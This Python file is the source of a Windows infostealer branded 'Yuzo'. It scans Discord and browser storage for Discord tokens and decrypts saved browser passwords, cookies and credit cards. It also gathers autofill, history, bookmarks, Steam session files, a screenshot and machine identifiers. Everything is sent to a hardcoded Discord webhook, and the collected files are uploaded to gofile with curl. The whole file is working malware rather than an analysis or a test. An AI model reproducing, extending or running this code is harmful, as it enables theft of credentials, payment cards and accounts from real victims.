# Version 1.0.0

import os
import re
import shutil
import random
import threading
import subprocess
from base64 import b64decode
from json import loads, dumps
from zipfile import ZipFile, ZIP_DEFLATED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
import json
import requests
from getmac import get_mac_address
try:
    from PIL import ImageGrab
except ImportError:
    import subprocess
    subprocess.check_call(['pip', 'install', 'Pillow'])
    from PIL import ImageGrab
import zipfile
import platform
try:
    import wmi
except ImportError:
    subprocess.check_call(['pip', 'install', 'wmi'])
    import wmi
try:
    import psutil
except ImportError:
    subprocess.check_call(['pip', 'install', 'psutil'])
    import psutil


h00k = "https://discord.com/api/webhooks/1416787330873688224/4PB-5IWwMalA9DM5aNtX2O1V1FhofPrA2HkcfBqrcPnSy-ue-s5xLi9jxaPpMAjup-5I"

def G37M4CH1N31NF0():
    try:
        def get_mac_address():
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK:
                        return addr.address
            return "N/A"

        mem = psutil.virtual_memory()
        c = wmi.WMI()
        GPUm = "N/A"
        for gpu in c.Win32_DisplayConfiguration():
            GPUm = gpu.Description.strip()

        current_machine_id = str(subprocess.check_output('wmic csproduct get uuid', shell=True, stderr=subprocess.DEVNULL), 'utf-8').split('\n')[1].strip()
        
        mac = get_mac_address()
              
        payload = {
            "embeds": [
                {
                    "title": "Yuzo | Machine Info",
                    "color": 2895667,
                    "fields": [
                        {"name": ":computer: PC Name", "value": f"`{platform.node()}`", "inline": True},
                        {"name": ":desktop: OS", "value": f"`{platform.platform()}`", "inline": True},
                        {"name": ":wrench: RAM", "value": f"`{mem.total / 1024**3:.2f} GB`", "inline": True},
                        {"name": ":pager: GPU", "value": f"`{GPUm}`", "inline": True},
                        {"name": ":zap: CPU", "value": f"`{platform.processor()}`", "inline": False},
                        {"name": ":key: HWID", "value": f"`{current_machine_id}`", "inline": False},
                        {"name": ":label: MAC", "value": f"`{mac}`", "inline": True},
                        {"name": ":crossed_swords: IP", "value": f"`{IP}`", "inline": True}
                    ],
                    "footer": {
                        "text": "Yuzo",
                        "icon_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512"
                    }
                }
            ],
            "username": "Yuzo",
            "avatar_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512"
        }     

        requests.post(h00k, data=dumps(payload), headers={"Content-Type": "application/json"})
    except Exception:
        pass

def G375734M():
    try:
        os.system("taskkill /F /IM Steam.exe > nul 2>&1")
        steam_path = os.environ.get("PROGRAMFILES(X86)", "") + "\\Steam"
        if not os.path.exists(steam_path):
            return

        ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]
        steam_config_path = os.path.join(steam_path, "config")
        zip_path = os.path.join(os.environ['TEMP'], "steam_session.zip")

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zp:
            if os.path.exists(steam_config_path):
                for root, _, files in os.walk(steam_config_path):
                    for file in files:
                        zp.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), steam_path))
            for ssfn_file in ssfn_files:
                zp.write(ssfn_file, os.path.basename(ssfn_file))
        
        embed = {
            "title": "Yuzo | Steam Session",
            "description": "Fichiers de session Steam de l'utilisateur.",
            "color": 2895667,
            "footer": {
                "text": "Yuzo",
                "icon_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512"
            }
        }

        payload = {
            "username": "Yuzo",
            "avatar_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512",
            "embeds": [embed]
        }

        with open(zip_path, 'rb') as f:
            files = {'steam_session.zip': f}
            requests.post(h00k, data={'payload_json': dumps(payload)}, files=files)

        os.remove(zip_path)
    except Exception:
        pass

def G375Cr33N5H07():
    try:
        sss = ImageGrab.grab()
        temp_path = os.path.join(temp, "ss.png")
        sss.save(temp_path)

        embed = {
            "title": "Yuzo | Screenshot",
            "description": "Capture d'écran de l'utilisateur.",
            "color": 2895667,
            "image": {
                "url": "attachment://ss.png"
            },
            "footer": {
                "text": "Yuzo",
                "icon_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512"
            }
        }
        
        payload = {
            "username": "Yuzo",
            "avatar_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512",
            "embeds": [embed]
        }

        with open(temp_path, "rb") as f:
            files = {'ss.png': f}
            requests.post(h00k, data={'payload_json': dumps(payload)}, files=files)
        
        os.remove(temp_path)
    except Exception as e:
        pass

badges = {
    "Discord_Employee": {"Value": 1, "Emoji": "Discord Employee", "Rare": True},
    "Partnered_Server_Owner": {"Value": 2, "Emoji": "Partnered Server Owner", "Rare": True},
    "HypeSquad_Events": {"Value": 4, "Emoji": "HypeSquad Events", "Rare": True},
    "Bug_Hunter_Level_1": {"Value": 8, "Emoji": "Bug Hunter Level 1", "Rare": True},
    "Early_Supporter": {"Value": 512, "Emoji": "<:6832badgeearlysupporter:1052974130334543973>", "Rare": True},
    "Bug_Hunter_Level_2": {"Value": 16384, "Emoji": "Bug Hunter Level 2", "Rare": True},
    "Early_Verified_Bot_Developer": {"Value": 131072, "Emoji": "<:developer:1052965409135013958>", "Rare": True},
    "House_Bravery": {"Value": 64, "Emoji": "<:bravery:1052965407453106246>", "Rare": False},
    "House_Brilliance": {"Value": 128, "Emoji": "<:brilliance:1052965401509765212>", "Rare": False},
    "House_Balance": {"Value": 256, "Emoji": "<:balance:1052965403363659796>", "Rare": False},
    "Discord_Active_Developer": {"Value": 4194304, "Emoji": "<:activedev:1053192696828801094>", "Rare": False},
}

def G37B4D635(flags):
    badges_list = ""
    for badge_name, badge_info in badges.items():
        if (flags & badge_info["Value"]) == badge_info["Value"]:
            badges_list += badge_info["Emoji"]
    return badges_list if badges_list else "`❌`"

def G37R4R3B4D635(user_flags):
    rare_badges = ""
    for badge_name, badge_info in badges.items():
        if (user_flags & badge_info["Value"]) == badge_info["Value"] and badge_info["Rare"]:
            rare_badges += badge_info["Emoji"]
    return rare_badges

def G37B1111N6(token):
    try:
        headers = {"Authorization": token, "Content-Type": "application/json"}
        response = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
        payment_sources = response.json()
        billing_info = ""
        for payment in payment_sources:
            if payment.get("type") == 2 and not payment.get("invalid"):
                billing_info += "<:7802paypal:1052975303904985229>"
            elif payment.get("type") == 1 and not payment.get("invalid"):
                billing_info += "<:948992883728461926:1052990389109391430>"
        return billing_info if billing_info else "`❌`"
    except:
        return "`❌`"

def G37FR13ND5(token):
    try:
        headers = {"Authorization": token, "Content-Type": "application/json"}
        response = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
        relationships = [rel for rel in response.json() if rel.get("type") == 1]
        result = ""
        for relation in relationships:
            user = relation.get("user", {})
            rare_badges = G37R4R3B4D635(user.get("public_flags", 0))
            if rare_badges:
                result += f"{rare_badges} | `{user.get('username')}#{user.get('discriminator')}`\n"
        return result if result else "*Aucun ami rare*"
    except:
        return "*Compte verrouillé*"

def G37N17R0(premium_type):
    if premium_type == 1:
        return "Nitro Classic"
    elif premium_type == 2:
        return "Nitro Boost"
    else:
        return "`❌`"

def G3770K3N5():
    raw_tokens = []
    tokens = []
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    paths = {
        "Discord": roaming + "\\Discord", "Discord Canary": roaming + "\\discordcanary",
        "Discord PTB": roaming + "\\discordptb", "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
        "Opera": roaming + "\\Opera Software\\Opera Stable", "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", 'Lightcord': roaming + "\\Lightcord",
        'Opera GX': roaming + "\\Opera Software\\Opera GX Stable", 'Amigo': local + "\\Amigo\\User Data",
        'Torch': local + "\\Torch\\User Data", 'Kometa': local + "\\Kometa\\User Data",
        'Orbitum': local + "\\Orbitum\\User Data", 'CentBrowser': local + "\\CentBrowser\\User Data",
        'Sputnik': local + "\\Sputnik\\Sputnik\\User Data", 'Chrome SxS': local + "\\Google\\Chrome SxS\\User Data",
        'Epic Privacy Browser': local + "\\Epic Privacy Browser\\User Data", 'Microsoft Edge': local + "\\Microsoft\\Edge\\User Data\\Default",
        'Uran': local + "\\uCozMedia\\Uran\\User Data\\Default", 'Iridium': local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
        'Firefox': roaming + "\\Mozilla\\Firefox\\Profiles",
    }

    for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith((".log", ".ldb", ".sqlite")):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    if token not in raw_tokens:
                                        raw_tokens.append(token)

    for token in raw_tokens:
        try:
            headers = {"Authorization": token, "Content-Type": "application/json"}
            user_res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
            if user_res.status_code != 200:
                continue
            
            user_data = user_res.json()
            user_id = user_data.get("id")
            username = user_data.get("username")
            discriminator = user_data.get("discriminator")
            avatar = user_data.get("avatar")
            email = user_data.get("email")
            flags = user_data.get("flags", 0)
            premium_type = user_data.get("premium_type", 0)
            
            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png?size=512" if avatar else "https://cdn.discordapp.com/embed/avatars/0.png"

            embeds = [{
                "color": 2895667,
                "fields": [
                    {"name": "Token", "value": f"```{token}```"},
                    {"name": "Email", "value": f"`{email}`", "inline": True},
                    {"name": "Ip Adress", "value": f"`{IP}`", "inline": True},
                    {"name": "Hostname", "value": f"`{os.hostname()}`", "inline": True},
                    {"name": "Badges", "value": G37B4D635(flags), "inline": True},
                    {"name": "Nitro", "value": G37N17R0(premium_type), "inline": True},
                    {"name": "Billing", "value": G37B1111N6(token), "inline": True}
                ],
                "author": {"name": f"{username}#{discriminator} | {user_id}", "icon_url": avatar_url},
                "footer": {"text": "Yuzo", "icon_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512"}
            }, {
                "color": 2895667,
                "description": G37FR13ND5(token),
                "author": {"name": "Amis Rares", "icon_url": avatar_url},
                "footer": {"text": "Yuzo", "icon_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512"}
            }]

            payload = {
                "username": "Yuzo",
                "avatar_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512",
                "embeds": embeds
            }
            requests.post(h00k, data=dumps(payload).encode(), headers={"Content-Type": "application/json"})
        except:
            pass

def G371P():
    try:return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:return "None"
    
IP = G371P()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")



def G108411NF0():
    try:
        username = os.getenv("USERNAME")
        ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{IP}")).read().decode().replace('callback(', '').replace('})', '}')
        ipdata = loads(ipdatanojson)
        contry = ipdata["country_name"]
        contryCode = ipdata["country_code"].lower()
        if contryCode == "not found":
            globalinfo = f":rainbow_flag:  - `{username.upper()} | {IP} ({contry})`"
        else:
            globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {IP} ({contry})`"
        return globalinfo

    except:
        return f":rainbow_flag:  - `{username.upper()}`"


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, K1W1F113s, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], [], ''

try:gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
except:gofileserver = "store4"
GLINFO = G108411NF0()

def L04DUr118(h00k, data='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(h00k, data=data, headers=headers))
            else:
                r = urlopen(Request(h00k, data=data))
            return r
        except: 
           pass



def G37D474(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return G37D474(blob_out)

def D3CrYP7V41U3(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except:pass
            return decrypted_pass       
       
def TrU57(C00K13s):
    global DETECTED
    data = str(C00K13s)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED

def Wr173F0rF113(data, name):
    path = os.getenv("TEMP") + f"\\cr{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

def SQ17H1N6(pathC, tempfold, cmd):
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(cmd)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    return data


def r3F0rM47(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def G37P455W(path, arg):
    try:
        global P455w, P455WC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in k3YW0rd:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in p45WW0rDs: p45WW0rDs.append(old)
                P455w.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3CrYP7V41U3(row[2], master_key)}")
                P455WC0UNt += 1
        Wr173F0rF113(P455w, 'passwords')
    except:pass

def G37C00K13(path, arg):
    try:
        global C00K13s, C00K1C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Cookies"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT host_key, name, encrypted_value FROM cookies ")

        pathKey = path + "/Local State"

        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                for wa in k3YW0rd:
                    old = wa
                    if "https" in wa:
                        tmp = wa
                        wa = tmp.split('[')[1].split(']')[0]
                    if wa in row[0]:
                        if not old in c00K1W0rDs: c00K1W0rDs.append(old)
                C00K13s.append(f"{row[0]}\tTRUE\t/\tFALSE\t2597573456\t{row[1]}\t{D3CrYP7V41U3(row[2], master_key)}")
                C00K1C0UNt += 1
        Wr173F0rF113(C00K13s, 'cookies')
    except:pass

def G37CC5(path, arg):
    try:
        global CCs, CC5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}")
                CC5C0UNt += 1
        Wr173F0rF113(CCs, 'creditcards')
    except:pass

def G374U70F111(path, arg):
    try:
        global AU70F11l, AU70F111C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")

        for row in data:
            if row[0] != '':
                AU70F11l.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AU70F111C0UNt += 1
        Wr173F0rF113(AU70F11l, 'autofill')
    except:pass

def G37H1570rY(path, arg):
    try:
        global H1570rY, H1570rYC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM urls")

        for row in data:
            if row[0] != '':
                H1570rY.append(row[1])
                H1570rYC0UNt += 1
        Wr173F0rF113(H1570rY, 'history')
    except:pass

def G37W3851735(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = r3F0rM47(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def G37800KM4rK5(path, arg):
    try:
        global B00KM4rK5, B00KM4rK5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        B00KM4rK5.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        B00KM4rK5C0UNt += 1
                    except:pass
        if os.stat(pathC).st_size == 0: return
        Wr173F0rF113(B00KM4rK5, 'bookmarks')
    except:pass
    
def s74r787Hr34D(func, arg):
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)
    
def G378r0W53r5(br0W53rP47H5):
    global Browserthread
    ThCokk, Browserthread, filess = [], [], []
    for patt in br0W53rP47H5:
        a = threading.Thread(target=G37C00K13, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

        s74r787Hr34D(G374U70F111,       [patt[0], patt[3]])
        s74r787Hr34D(G37H1570rY,        [patt[0], patt[3]])
        s74r787Hr34D(G37800KM4rK5,      [patt[0], patt[3]])
        s74r787Hr34D(G37CC5,            [patt[0], patt[3]])
        s74r787Hr34D(G37P455W,          [patt[0], patt[3]])

    for thread in ThCokk: thread.join()
    if TrU57(C00K13s) == True: __import__('sys').exit(0)
    for thread in Browserthread: thread.join()

    for file in ["crpasswords.txt", "crcookies.txt", "crcreditcards.txt", "crautofills.txt", "crhistories.txt", "crbookmarks.txt"]:
        filess.append(UP104D7060F113(os.getenv("TEMP") + "\\" + file))
    headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}

    data = {
        "content": GLINFO,
        "embeds": [
            {
                "title": f"Yuzo | Password Stealer",
                "description": f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [YuzoPasswords.txt]({filess[0]})",
                "color": 2895667,
                "footer": {"text": f"Yuzo",  
                "icon_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512"}
            },
            {
                "title": f"Yuzo | Cookies Stealer",
                "description": f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [YuzoCookies.txt]({filess[1]})",
                "color": 2895667,
                "footer": {"text": f"Yuzo",  
                "icon_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512"}
            },
            {
                "title": f"Yuzo | Browser Data",
                "description": f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n<a:CH_IconArrowRight:715585320178941993> • [YuzoHistories.txt]({filess[4]})\n\n<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n<a:CH_IconArrowRight:715585320178941993> • [YuzoAutofills.txt]({filess[3]})\n\n<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n<a:CH_IconArrowRight:715585320178941993> • [YuzoCreditCards.txt]({filess[2]})\n\n:bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n<a:CH_IconArrowRight:715585320178941993> • [YuzoBookmarks.txt]({filess[5]})",
                "color": 2895667,
                "footer": {"text": f"Yuzo",  
                "icon_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512"}
            }
        ],
        "username": f"Yuzo",
        "avatar_url": "https://cdn.discordapp.com/app-icons/1324817666359427102/e85d0dfcc58411d8e6d496214317390c.png?size=512",
        "attachments": []
    }
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
    return

def UP104D7060F113(path):
    try:
        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
    except: return False

def S74r77Hr34D(meth, args = []):
    a = threading.Thread(target=meth, args=args)
    a.start()
    THr34D1157.append(a)


def G47H3r411():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    br0W53rP47H5 = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]


    S74r77Hr34D(G378r0W53r5,   [br0W53rP47H5,]                                      )
    S74r77Hr34D(G3770K3N5)
    S74r77Hr34D(G375Cr33N5H07)
    S74r77Hr34D(G375734M)
    S74r77Hr34D(G37M4CH1N31NF0)


def init():
    G47H3r411()

